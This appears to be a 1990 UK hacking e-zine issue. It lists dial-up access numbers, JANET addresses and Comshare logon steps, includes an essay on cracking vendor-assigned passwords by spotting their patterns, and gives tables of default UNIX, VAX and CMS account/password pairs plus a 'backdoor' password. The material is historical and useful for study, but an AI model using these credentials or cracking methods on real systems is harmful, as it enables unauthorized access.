+intomore detail...(by the way, you'll need to login with username 'pdsoft' and
+password 'pdsoft' - both in lower case) Bye for now, and have great fun - I
+did! Cheers, Boz
+ 
+Birmingham U...............021-471-2611
+                           021-471-2101
+Cambridge U................0223-338888 (V21/23)
+                           0223-338848 (V21/22/22bis/23)
+Cranfield U................0234-752795
+                           0234-752796
+Daresbury U................0925-68461 (V21/22/22bis/23 and MNP) *
+Durham U...................091-374-2832
+Edinburgh U................031-667-1071 (V21/22)
+Glasgow U..................041-334-8100
+U. of Lon. Comp. Centre....071-831-6171 (V21/22)
+                           071-831-6181 (V23 - 8-N-1) *
+U. College Lon.............071-388-2333 (V21/22/22bis) *
+Queen Mary's College Lon...081-980-7100 (V21)
+                           081-981-7331 (V23)
+King's College Lon.........071-379-7985 (V21)
+                           071-240-4928 (V23)
+Lancaster U................0544-677544 (V21/22/22bis/23+MNP - 8-N-1) *
+Leeds U....................0532-461514 (use CALL Jnnnnnnnnnnnn) *
+Nottingham U...............0602-507521 (V21/22/22bis/23) *
+                           0602-507522 (V23)
+                           0602-507523 (V22) *
+Oxford U...................0865-722311 (V21/22/22bis/23)
+Strathclyde U..............041-552-8467
+York U.....................0904-433826 (V21)
+                           0904-433827 (V23)
+ 
+ 
+ 
+ 
+                 UPDATES WITH THIS REVISION (1.3):
+ 
+Added Leeds Uni's PAD (0532-461514).
+Changed the line format slightly to squeeze in more comments.
+Changed the format of the introductory notes to make them more readable (!)
+Changed all London 01 codes to the new 071/081 format.
+ 
+REVISION 1.2 (1 Mar '90)
+ 
+Another name change - to JPADxx.TXT.
+Hopefully this is easier to type - and leaves me a bit of room for extending
+the filename if necessary!
+ULCC's V23 node (071-831-6181) is actually 8-N-1 and not 7-E-1 as listed in
+previous revisions.
+The PAD's which I have actually tested and found to work OK are now markedwith
+asterisks (*).
+ 
+REVISION 1.1 (18th Feb '90)
+ 
+Lancaster Uni's PAD actually uses 8 bits, no parity, one stop bit instead of
+7-E-1! Apologies for the error...No more mistakes detected so far...! Cheers,
+Boz.
+ 
+ 
+===============================================================================
+ 
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #07 of 20   H
+                N                                         N
+                E       JANET NETWORK ADDRESS LIST        E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+>
+>Introduction
+>____________
+>
+>This is an address list of all the JANET mnemonics that can  be  accessed  via
+>the JANET Packet SwitchStream Gateway.
+>
+>The list is sorted in numerical order using the machine address.
+>
+>The list is divided into 3 columns which show:
+>
+>a. The numeric address (DTE address)
+>
+>b. A mnemonic for the address
+>
+>c. A description of where the machine is located.
+>
+>Address List
+>____________
+>
+Frm    2; Next>
+>ADDRESS                MNEMONIC   DESCRIPTION
+>_______                ________   ___________
+>
+>000000000002           RLIB       IBM 3081 VM/370 at Rutherford
+>000000000002.XXX       RLIB
+>000000000002.XXXP      RLIBP      RAL IBM full screen 3270 emulator
+>000000000003           RLIC       RAL IBM MVS
+>000000000003.XXX       RLIC
+>000000000003.XXXP      RLICP      RAL IBM MVS full screen.
+>000000000003.XXXS      RLICS      RAL IBM MVS
+>000000000006           RLPA       PRIME at Rutherford (Prime A)
+>000000000023           RLPC       EBL PRIME at RAL (Prime C)
+>000000000025           WKPA       PRIME at Warwick
+>000000000033           RLVS       Starlink VAX 11/780 at Rutherford
+>000000000040.PSS       PSS
+>000000000040           RLXA       RL GEC 4160 PSS Gateway
+>000000000065           RLVB       BCRG VAX 11/780 at Rutherford
+>000000000067           RLGM       GEC 4190 - ALVEY Mail Machine
+>000000000069           RLVC       RAL VAX 11/750 St/CB in R26
+>000000001200           ZIIA       IBM 4341 Imperial College
+>000000001200.XXXP      ZIIAP      IBM 4341 Imperial College
+>000000002101           RLPF       PRIME - Technology Division
+Frm    3; Next>
+>000000002102           RLPE       PRIME - Lab overheads.
+>000000002104           RLPG       Ral Tech Division PRIME
+>000000002105           RLGB       ICF GEC 4090 - RLGB at Rutherford
+>000000002202           RLXC       Reverse Pad at RAL
+>000000002251           BAPA       BATH Prime 2250
+>000000002500           RLGD       RL ISG 4090
+>000000002507           XXDB       Oxford PDP-11/70
+>000000002600           GXVA       RGO VAX 11/750
+>000000002602           GXVS       RGO STARLINK VAX 11/780
+>000000004012           RLDE       R3 PDP-11 SNS
+>000000004200           RLPH       RAL Technology Div. PRIME
+>000000004400           RLNA       R25 Nord (EISCAT Project)
+>000000004600           RLVA       HEP VAX 750
+>000000004601           RLVE       CD VAX 11/750 (VMS)
+>000000004602           RLVD       IKBS Vax 11/750 at RAL
+>000000004603           RLVF       ALVEY VAX DEV.
+>000000004605           RLVI       EBL VAX
+>000000004606           RLVJ       Technology Div. Microvax II
+>000001000200           DLGD       DL GEC at DL (Network converter)
+>000001000200*D:NETSTAT NETSTAT
+>000001000200*D:ITP.1000450.046400 TELLDL
+>000001000200*D:ITP.1000450.04FE00 HELPDL
+Frm    4; Next>
+>000001000200*D:ITP.1000450.46500  NETMON
+>000001000200*D:ITP.1000450.44400  LOG
+>000001009400           DLGE       DL GEC 4090 at Daresbury
+>000001002000           DLVA       DL SRS VAX 11/750 at Daresbury
+>000001002100           DLGM       DL GEC 4065 MAIL machine
+>000001003000           DLVB       DL VAX B
+>00000100900000         DLIB       DL - MVS service
+>00000100900010         DLIB       DL - MVS service
+>000001011700           DLGA       DL CSE/1 GEC 4190 at Daresbury
+>000001011750           NNGA       DL NSFD/R1 at Daresbury
+>000001080500           LEVA       VAX at Leeds University (Mech Eng)
+>000001500100           NEDA       Newcastle DCS-UNIX front-end
+>000001500200           NEVA       Newcastle VAX 11/780
+>000002002100           ZKGA       GEC 4065 at Kings college, London
+>000002005002           ZUVS       Starlink VAX at UCL
+>000002005003           ZUPA       PRIME at UCL
+>000002009001           ZMVA       QMC Physics VAX.
+>000004008100           HQGA       GEC 4090 at NERC Swindon
+>000005112300           ZUVA       HEP Vax at UCL (Physics Dept).
+>000005181000           RHVA       Vax at Royal Holloway.
+>000006000000           YKXA       DEC10 Gateway at York (BALHAM)
+>000006000003           YKDB       S/W Technology Vax 11/750
+Frm    5; Next>
+>000007002002           REVS       Starlink VAX at ROE
+>000007004001           EKVA       East Kilbride Kelvin Lab VAX
+>000007012001           PAVA       Paisley VAX
+>000008002020           CAXA       X29 G/way to Cambridge Data Network
+>000008005001           CAVS       Starlink VAX at Cambridge
+>000008006001           EAPA       PRIME 550 at East Anglia
+>000008006002           EAVA       East Anglia (Stocker) VAX
+>000008006003           EAVB       East Anglia (CPC) VAX
+>000008012701           CAVB       HEP Vax at Cambridge
+>000009001001           CPXA       Cernnet Gateway
+>000009001003           CPXB       CERN reverse PAD (Test)
+>000009003001#0         CPXC       CERN Memotec Pad.
+>000009003002#0         CPIA       CERN WYLBUR
+>000009003003#1         CPVM       CERN Aleph Development Vax
+>000009003003#3         CPVL       CERN L3 Vax 11/750
+>000009003003#5         CPVG       CERN VXGIFT
+>000009003004#1         CPVC       CERN Omega Vax 11/780
+>000009003004#2         CPVF       CERN Aleph Test Beam Vax 11/750
+>000009003004#3         CPVA       CERN OC Development Vax 11/750
+>000009003004#4         CPVD       CERN Merlin Vax
+>000009003005#3         CPVV       CERN Central Vax 8600
+>000009003006#1         CPVN       CERN VXNA31
+Frm    6; Next>
+>000009003007#1         CPVS       CERN VXBSSY
+>000009501001           DYVB       Tasso VAX 11/780 at DESY, Hamburg
+>000010100001           MAVG       VAX 11/750 at Manchester CGU
+>000010109001           MAVS       Manchester Starlink Vax 750
+>000010120200           MAGB       DL GEC 4190 at Manchester
+>00001012030002         MANV2      Manchester Physics Vax 2.
+>000010216001           UMPA       PRIME at UMIST
+>000010404000           LAVB       Lancaster University VAX
+>000010411000           LAVA       Lancaster University HEP VAX.
+>000010501460           LLIA       Liverpool HEP IBM 4331
+>000010501460.XXXP      LLIAP      Liverpool HEP IBM 4331
+>000011200250           QUVA       Vax in Applied Maths Belfast
+>000012110002           BDGA       GEC 4090 at Bradford
+>000014000300           DUVS       Durham Starlink VAX
+>000014901000*P7*W2.SPCP           NRS NRS Prime
+>000020013201           BHIA       IBM 4341 BIRMINGHAM
+>000020013201.XXXP      BHIAP      IBM 4341 BIRMINGHAM
+>000020013301           BHVS       Starlink VAX at Birmingham
+>000020013501           BHGB       DL NSF GEC 4065  at Birmingham
+>000021000008           NMPA       PRIME at Nottingham
+>000021110101           LTGA       ICF GEC 4090 at Loughborough
+>000040000040.PSS       LPSS       JNT London PSS Gateway
+Frm    7; Next>
+>000040000040           LNXB       JNT London 4160 PSS Gateway
+>00004960000001         ESSEX      Essex Computer Service.
+>00005000500150         RLGJ       GEC 4190  - JNT/NE NMU
+>000050005002           RLGG       GEC 4160 - JANET News Machine
+>000050005002           NEWS       GEC 4160 - JANET News Machine
+>000050200013           XXVE       Oxford Comp. Centre Vax
+>000050200014           XXVF       Oxford Comp. Centre Vax
+>000050250050           XXVA       Oxford Physics Vax
+>000052005000           WKGA       GEC 4000 machine at Warwick.
+>000052100100           MUVA       MSSL Vax/780
+>000060210005           BRVA       Bristol Physcis Dept VAX.
+>000060500001*P7*W2     EXPA       Exeter Prime.
+>000060500003*P7*W2     EXPC       Exeter Prime.
+>000060500004*P7*W2     EXPD       Exeter Prime.
+>000060500005*P7*W2     EXPE       Exeter Prime.
+>000071100009           GWIA       IBM 4341 at Glasgow
+>000071100009.XXXP      GWIAP      IBM 4341 at Glasgow
+>000000000068           GWIA       IBM 4341 at Glasgow
+>000000000068.XXXP      GWIAP      IBM 4341 at Glasgow
+>000071104001           GWGA       GEC 4180 at Glasgow
+End of file - Frm    8; Next>
+ 
+===============================================================================
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+ 
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #08 of 20   H
+                N                                         N
+                E    Comshare PADS+Info by Knight_of_ni   E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+ 
+                          Debenhams Comshare PADs
+                          --------- -------- ----
+ 
+                              300/300             1200/75
+ 
+     Aberdeen                 0224 573405         0224 573405
+     Aberdeen                 0224 580281         0224 580281
+     Belfast                                      0232 249290
+     Bedford                  0234 218233         0234 218233
+     Birmingham                                   021 233 4165
+     Birmingham               021 705 7070        021 704 4011
+     Bournemouth              0202 25542          0202 25542
+     Brighton                 0273 203551         0273 203551
+     Bristol                                      0272 279977
+     Bristol                  0272 215481         0272 215481
+     Cambridge                0223 351312         0223 351312
+     Canterbury               0227 67571          0227 67571
+     Cardiff                                      0222 384511
+     Cardiff                  0222 372471         0222 372471
+     Carlisle                 0228 31667          0228 31667
+     Chelmsford               0245 87512          0245 87512
+     Chester                  0244 310073         0244 310073
+     Chester                                      0244 47002
+     Derby                    0332 31727          0332 31727
+     Dundee                   0382 25492          0382 25492
+     Eastbourne               0323 647422         0323 645361
+     Edinburgh                031 225 8509        031 225 8509
+     Exeter                   0392 215355         0392 215355
+     Folkstone                0303 43771          0303 43771
+     Glasgow                  041 248 3397        041 248 3397
+     Gloucester               0452 503959         0452 503959
+     Grange O/Sands                               04484 4661
+     Guildford                0483 506118         0483 579717
+     Harrogate                0423 60522          0423 60522
+     Hastings                 0424 445577         0424 445577
+     Hull                     0482 27492          0482 27492
+     Ipswich                  0473 56431          0473 56431
+     Ipswich                                      0473 50341
+     Leeds                    0532 459477         0532 459477
+     Leeds                                        0532 460733
+     Luton                    0582 458505         0582 411184
+     Manchester               061 834 2848        061 834 4143
+     Manchester                                   061 834 5226
+     Middlesbrough            0642 248581         0642 248581
+     Newcastle                091 261 0131        091 261 0131
+     Northampton              0604 20253          0604 20253
+     Norwich                  0603 667061         0603 667061
+     Nottingham               0602 472576         0602 412045
+     Oxford                   0865 250888         0865 250888
+     Plymouth                 0752 670170         0752 670170
+     Reading                  0734 507445         0734 507445
+     Romford                  0708 22380          0708 752861
+     Scarborough              0723 353891         0723 353891
+     Sheffield                0742 701158         0742 701158
+     Southampton              0703 226674         0703 229224
+     Southsea                 0705 833621         0705 833621
+     Staines                  0784 62151          0784 62344
+     Stirling                 0786 73215          0786 73215
+     Stockport                061 477 7123        061 477 7123
+     Stockton on Tees         0642 677557         0642 677557
+     Stratford                0789 294102         0789 294102
+     Swansea                  0792 473686         0792 473686
+     Swindon                  0793 615471         0793 615471
+     Taunton                  0823 251629         0823 335231
+     Telford                  0952 507323         0952 507323
+     Wigan                    0942 324544         0942 498111
+     York                     0904 647041         0904 647041
+ 
+ 
+                           ***Knight_of_ni***
+ 
+ 
+To logon to comshare :
+ 
+at the prompt WHICH SERVICE type
+*CSA if you logged on at v21
+*CSB if you logged on at v23
+or type 3 this last one will get you a viewdata computer
+or type 8 this will give you HP Info .
+ 
+at the prompt COMSHARE:
+type A gives commander II system A
+type B gives commander II system B
+type C gives commander II system C
+type I gives commander II system I
+type Q gives a VM computer send a break to logon
+type T gives telecom gold
+ with  lots  of  computers off this ,  use CALL xx where  xx  is  a
+ number, eg. CALL 01 gives Campus 2000 , you can call all the usual
+ telecom gold computers from here.
+ 
+type P gives access to a prompt WHICH SERVICE ,from here type  all
+ of the above or 3 which gives MERCURY LINK 7500.
+ 
+Sometimes  at  the  COMSHARE prompt if you type  V  you'll  get  a
+ decserver with 4 VAXs' hanging off it.
+ If you come across the V working again let me know,  as I've  full
+ privs on it!
+ 
+At  the  COMSHARE  prompt if you type '12'  you'll  get  results  on
+ commander II system B.
+ 
+Any additions or amendments please contact me on Hackernet BBS.
+===============================================================================
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #09 of 20   H
+                N                                         N
+                E      How to Crack Those PASSWORDS!      E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+                   THE SO-CALLED "UNCRACKABLE" PASSWORD
+                  --------------------------------------
+ 
+Many people consider the type of password - the so-  called random combination
+of alpha and numeric characters  - to be "uncrackable" because so many billions
+ 
+of  combinations seem possible. A six-character password of  this type using
+only letters and numerals, could have  2,238,976,116 variations. This type of
+password is most  frequently used by large data-base vendors. It is assigned
+ to the user by the vendor, and is often used with systems  requiring only one
+access level (that is, no second  security number) because the password is
+believed to be so  invulnerable to cracking.
+ 
+In reality, however, this password format is vulnerable  to solution by both
+doors and algorithms. In the first case, not all passwords require the presence
+ 
+of numbers. Passwords may be alphabetic characters only. In some cases pass-
+words such as "GUEST" or "IBMCE" may provide a backdoor into the system.
+ 
+Solution by algorithmcan also be simple because most systems do not use a truly
+ 
+random method for generating passwords.  We know, for example, that MILNET
+passwords exclude certain letters and numbers. There are doubtlessly other
+rules involved  in their construction that we could discover. A study of pass-
+words from a given system - we'll use Dow Jones  as an example here - can
+reveal the patterns that are used to create such "uncrackable" passwords.
+ 
+Dow Jones passwords are generally 10 characters long. If character assignment
+were truly random, we would expect that most of the characters would be alpha-
+betic because there are 26 alpha characters compared to only 10 numeric char-
+acters. A random system would generate 2.6 alphas for each numeric character.
+In fact, however, Dow Jones passwords appear to have only 4 or 5 alphabetic and
+ 
+have 5 or 6 numeric characters. This is our first clue that the password sel-
+ection proccess is not random. Here is a sample of the typical Dow Jones
+passwords:
+ 
+92J62P4BUF
+35K4UPK931
+59LTAN7521
+ 
+Patterns are readily discernable:
+ 
+1) The first two characters are numbers
+2) The third character is a letter of the alphabet
+3) Each password has at least two numbers that are duplicates.
+4) No password has three numbers that are the same
+5) Each password has one three-letter combination that includes a vowel
+   (eg. BUF,UPK,TAN)
+6) This alpha-triplet can begin at any character from the fourth to the eighth
+   position.
+7) No password has more than one vowel.
+8) Passwords may have either 4 or 5 alphabetic characters.
+9) While a password may have two alpha characters that are the same,these
+   letters do not follow one another,
+10) Of the 16 numbers used in the passwords above, none is a zero.
+ 
+Examination of a large number of passwords would doubtlessly reveal other
+"rules" that were used in Dow Jones password selection. Each newly-discovered
+"rule" would limit the actual number of available passwords and make the system
+ 
+that much more subject to cracking by computer.
+ 
+TAKING THE "RANDOM" OUT OF RANDOM
+ 
+One of the most notable factors in so-called tables of computerized "random"
+numbers is that there are two basic ways of creating them. The first method is
+to create a table that will provide what can statistically be said to be a
+random list - that is no number or letter would theoretically occur more
+frequently than any other number or letter. Most systems, however, simply rely
+on an electronic component that creates alledgedly "random" numbers. These
+hardware random number generators are usually biased in their number selections
+ 
+ 
+One simple test of a random number generator is called the  "coin toss test." A
+ 
+program is written to simulate the results of a thousand or so coin tosses.
+Were the random number generator truly random, heads would appear about as
+frequently as tails. In an actual test, however, heads appeared 421 times, and
+tails appeared 579 times - a significant bias. A test such as this could be
+performed over the entire alphanumeric character list and the component's bias
+chartered.  Once this information was known, the cracking computer could be
+programmed to insert this selection bias into it's own attempts to generate
+passwords. This is yet another step that evens the odds between the hacker and
+the so-called "uncrackable" password. This testing scheme, requiring either a
+component or a computer like the target computer, would be a lengthy process,
+but some people might regard the product as worth the time involved in
+preparing such an analysis. A strategy of cracking Dow Jones system, given the
+rules listed above, would be to create a program with an algorithm that
+provided  combinations of passwords meeting the criteria above. As each
+creation was tested, a pattern might be found in the successful creations that
+would make the algorithm even more selective. One would expect, for example,
+that simular to the MILNET and ARPANET passwords, certain confusing characters
+would be eliminated from passwords. The number, "0" is often eliminated, for
+example, because it is easily confused with the letter "O".
+ 
+===============================================================================
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #10 of 20   H
+                N                                         N
+                E  Default Passwords by Nik & Bauderline  E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+On UNIX systems at your first call enter the id 'who' <CR> on some systems you
+will get a list of who is online  - if that works you have some valid ID's!
+If you know some already try them out with a 'backdoor' pass-word of 'woof'.
+ 
+UNIX:-
+ 
+                            ID              Password
+                            --------        --------
+                            root            root
+                            sysman          sysman
+                            admin           admin
+                            sysadmin        sysadmin (or admin)
+                            unix            unix
+                            uucp            uucp (or comms)
+                            rje             rje
+                            guest           guest
+                            demo            demo
+                            daemon          daemon
+                            sysbin          sysbin (or bin)
+                            bin             bin
+                            games           games (or player sometimes)
+ 
+VAX:-
+                            POSTMASTER      POSTMASTER
+                            SYSTEST         SYSTEST
+                            FIELD           FIELD
+                            FIELD           SERVICE
+                            GUEST           WELCOME
+                            GUEST           FRIEND
+                            DEMO            DEMO
+                            GEAC            GEAC (on microvaxes only)
+                            USER            USER
+                            SYSTEM          MANAGER
+                            USERP           USERP
+                            VISITOR         VISITOR
+                            REMOTE          REMOTE
+                            DECNET          DDECNET
+ 
+CMS:-
+                            OPERATNS/IPCS RSCS RSCSNET
+                            diskacnt/acnt
+                            dirmaint/dirm
+                            cmsbatch/batch
+                            datamovr/movr
+                            ispvm
+                            ipcs
+                            erep
+                            ibmcemaint smart
+                            vseipo router
+                            cprm sqldba
+                            autolog1/autolog
+                            sysdump1/sysdump
+                            pvm
+===============================================================================
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+ 
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #11 of 20   H
+                N                                         N
+                E   CCITT Recommendations by Zed Haytey.  E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+ 
+                         CCITT RECOMENDATIONS
+ 
+V series - covering data transmissions over telephone lines
+ 
+V1   Equivalence between binary notation stmbols and the significant cond-
+     itions of a two conditioned code
+V2   Power levels for data transmission over telephone lines
+V3   International Alphabet No.5 (ASCII)
+V4   General structure of signals of International Alphabet No.5 code for
+     data transmissions over public telephone networks
+V5   Standardisation of modulation rates and data signalling rates for
+     synchronoous data transmission in general switched network
+V6   Ditto, on leased telephone type circuits
+V7-9 Not assigned
+V10  Electrical characteristics for unbalanced double current interchange
+     circuits for general use with integrated circuits
+V11  Ditto, for balanced double current interchange circuits
+V12  Not assigned
+V13  Answerback simulator
+V14  Not assigned
+V15  Use of acoustic coupling for data transmission
+V16  Recommendation for modems for transmission of medical analogue data
+V19  Modems for parallel data transmissions using telephone signalling
+     frequencies
+V20  Parallel data transmission modems standardised for universal use in
+     the general switched network
+V21  300 Baud modem standardised for use in the switched telephone network
+V22  1200 Baud full duplex 2 wire modem standardised for use in the
+     general switched telephone network
+V22b 2400 Baud full duplex 2 wire modem standardised for use in the
+     general switched telephone network
+V23  600/1200 baud modem standardised for use in the general switched
+     telephone network
+V24  List of definitions for interchange circuits between data terminal
+     equipment and data circuit terminating equipment (i.e. modem)
+V25  Automatic calling and/or answering equipment on the general switched
+     telephone network
+V25b Bit synchronous auto dialling protocol for use over PSTN
+V26  2400 baud modem for use on 4 wire point to point circuits
+V26b 2400/1200 baud modem standardised for use in the general switched
+     telephone network
+V27  4800 baud modem for leased circuits
+V27b 4800/2400 modem with automatic adaptive equaliser standardised for
+     use on leased circuits
+V27t 4800/2400 modem standardised for use on the general switched
+     telephone network
+V28  Electrical characteristics for unbalanced double current interchange
+     circuits
+V29  9600 baud modem for use on leased circuits
+V30  Not assigned
+V31  Electrical characteristics for single current interchange circuits
+     controlled by contact closure
+V32-4Not Assigned
+V35  Data transmission at 48 kilobits per second using 60-108KHz group
+     band circuits
+V36  Modems for synchronous data transmission using 60-108kHz group band
+     circuits
+V37-9Not assigned
+V40  Error indication with electromechanical equipment
+V41  Code independent error correction system
+V42-9Not assigned
+V50  Standard limits for transmission quality of data transmission
+V51  Organisation of the maintenance of international telephone type
+     circuits for data transmission
+V52  Characteristics of distortion and error rate measuring apparatus for
+     data transmission
+V53  Limits for the maintenance of telephone type circuits used for data
+     transmissions
+V54  Loop test device for modems
+V55  Specification for an impulsive noise measuring instrument for
+     telephone type circuits
+V56  Comparative test for modems for use over telephone type circuits
+V57  Comprehensive test set for high signalling rates.
+ 
+by Zed Haytey 1990
+ 
+ 
+********************************************************************
+********************************************************************
+ 
